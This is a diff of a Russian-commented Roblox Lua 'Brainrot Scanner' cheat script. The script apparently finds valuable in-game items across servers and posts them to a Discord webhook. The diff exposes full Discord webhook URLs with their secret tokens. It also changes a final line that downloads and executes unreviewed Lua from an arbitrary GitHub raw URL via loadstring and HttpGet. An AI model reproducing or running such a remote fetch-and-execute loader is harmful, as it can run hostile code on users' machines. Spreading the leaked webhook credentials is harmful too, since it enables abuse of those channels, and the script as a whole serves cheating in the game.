@@ -9,39 +9,62 @@ local HttpService = game:GetService('HttpService')
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
 local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s для особо важных объектов
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424146317604687932/G5mtYy3JUjj0I8OQxIyxBDfr2oU0tHGe96R00BnoUDeRGukoPeSYn4AJBAnCrHJz0da4'
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424147041311002656/W_E7_-Z9DUucHP4p5BqOYeVKWhtACzAzVQCNW2nD0CPikwwk4yfEBVbgmV_wVsoNR_Oo'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
 -- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
 local OBJECTS = {
+    ['La Vacca Saturno Saturnita'] = { emoji = '🐮', important = false },
+    ['Chimpanzini Spiderini'] = { emoji = '🕷', important = false },
+    ['Los Tralaleritos'] = { emoji = '🐟', important = false },
+    ['Las Tralaleritas'] = { emoji = '🌸', important = false },
+    ['Graipuss Medussi'] = { emoji = '🦑', important = false },
+    ['Torrtuginni Dragonfrutini'] = { emoji = '🐉', important = false },
+    ['Pot Hotspot'] = { emoji = '📱', important = false },
+    ['La Grande Com1binasion'] = { emoji = '❗️', important = true },
     ['Garama and Madundung'] = { emoji = '🍝', important = true },
+    ['Secret Lucksfsfsfy Block'] = { emoji = '⬛️', important = false },
     ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
     ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
-    ['Esok Sekolah'] = { emoji = '🏠', important = true, high_priority = true },
+    ['Las Vaquitas Saturnitas'] = { emoji = '👦', important = false },
+    ['Chicleteira Bicic1leteira'] = { emoji = '🚲', important = true },
+    ['Los Comb1inasionas'] = { emoji = '⚒️', important = true },
+    ['Agarrini la Palini'] = { emoji = '🥄', important = false },
+    ['Los Hotspotsitos'] = { emoji = '☎️', important = true },
+    ['Esok Sekolah'] = { emoji = '🏠', important = true },
+    ['Nooo My Hotspot'] = { emoji = '👽', important = false },
     ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
+    ['Admin Lucky Block'] = { emoji = '🆘', important = false },
     ['Ketupat Kepat'] = { emoji = '🍏', important = true },
     ['Strawberry Elephant'] = { emoji = '🐘', important = true },
     ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
     ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
+    ['La Secret Combinasion'] = { emoji = '❓', important = true },
+    ['La Kark56656erkar Combinasion'] = { emoji = '🥊', important = false },
+    ['Los Bros'] = { emoji = '📱', important = true },
     ['Tralaledon'] = { emoji = '🦈', important = true },
-    ['La Extinct Grande'] = { emoji = '🩻', important = true, high_priority = true },
+    ['La Extinct Grande'] = { emoji = '🩻', important = true },
+    ['Los Chicleteiras'] = { emoji = '🚳', important = true },
+    ['Las Sis'] = { emoji = '👧', important = true },
+    ['Tacorita Bicicleta'] = { emoji = '📱', important = false },
     ['Tictac Sahur'] = { emoji = '🕰️', important = true },
+    ['Celularcini Viciosini'] = { emoji = '📞', important = true },
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
     ['Tang Tang Keletang'] = { emoji = '📢', important = true },
-    ['Money Money Puggy'] = { emoji = '🐶', important = true }, 
+    ['Money Money Puggy'] = { emoji = '🐶', important = true },
     ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
-    ['Chillin Chili'] = { emoji = '🌶', important = true, high_priority = true },
-    ['La Secret Combinasion'] = { emoji = '❓', important = true },
+    ['Chillin Chili'] = { emoji = '🌶', important = true },
     ['Eviledon'] = { emoji = '👹', important = true },
+    ['La Spooky Grande'] = { emoji = '🟧', important = true },
+    ['Los Mobil1is'] = { emoji = '🧕', important = true },
     ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
-    ['La Spooky Grande'] = { emoji = '👻', important = true, high_priority = true },
+    ['Mieteteira Bicicleteira'] = { emoji = '☠️', important = true },
     ['Meowl'] = { emoji = '🐈', important = true },
-    ['Chipso And Queso'] = { emoji = '🧀', important = true, high_priority = true },
+    ['Chipso and Queso'] = { emoji = '🧀', important = true },
+    ['Chipso And Queso'] = { emoji = '🧀', important = true },
     ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
     ['Headless Horseman'] = { emoji = '🐴', important = true },
-    ['Mariachi Corazoni'] = { emoji = '💀', important = true },
-    ['La Taco Combinasion'] = { emoji = '👒', important = true },
 }
 
 -- Создаем списки важных объектов
@@ -557,4 +580,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/valkiri61-cloud/dsfsdf/refs/heads/main/dfesdf.lua"))()
